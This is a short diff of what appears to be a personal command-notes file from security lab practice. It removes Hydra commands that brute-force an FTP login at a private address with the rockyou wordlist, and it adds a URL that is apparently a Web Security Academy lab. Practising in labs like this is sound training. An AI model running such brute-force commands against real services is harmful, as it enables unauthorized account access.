@@ -1,4 +1,1 @@
-hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.91.2
-sudo gunzip /usr/share/wordlists/rockyou.txt.gz
-hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 1 -W 10 ftp://192.168.91.2
-ls /usr/share/wordlists/
+https://0a9b00db03ed7a5380b13fb500900083.web-security-academy.net/
